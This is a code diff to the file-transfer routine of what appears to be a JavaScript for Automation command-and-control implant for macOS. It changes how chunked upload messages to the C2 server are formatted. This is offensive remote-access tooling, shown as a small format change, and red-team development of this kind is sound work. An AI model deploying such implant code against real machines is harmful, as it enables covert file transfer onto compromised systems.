@@ -476,7 +476,9 @@ class customC2 extends baseC2{
 	}
 	upload(task, file_id, full_path){
 		try{
-			let data = {"action": "post_response", "upload":{"file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path, "task_id": task.id}};
+			let data = {"action": "post_response", "responses":[
+					{"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": 1, "full_path": full_path}, "task_id": task.id},
+				]};
 			let chunk_num = 1;
 			let total_chunks = 1;
 			let total_data = $.NSMutableData.dataWithLength(0);
@@ -488,7 +490,9 @@ class customC2 extends baseC2{
 				chunk_num = file_data['chunk_num'];
 				total_chunks = file_data['total_chunks'];
 				total_data.appendData($.NSData.alloc.initWithBase64Encoding($(file_data['chunk_data'])));
-				data = {"action": "post_response", "upload":{"file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1, "task_id": task.id}};
+				data = {"action": "post_response", "responses":[
+					{"upload": {"file_id": file_id, "chunk_size": 512000, "chunk_num": chunk_num + 1}, "task_id": task.id}
+				]};
 			}while(chunk_num < total_chunks);
 			return total_data;
 		}catch(error){
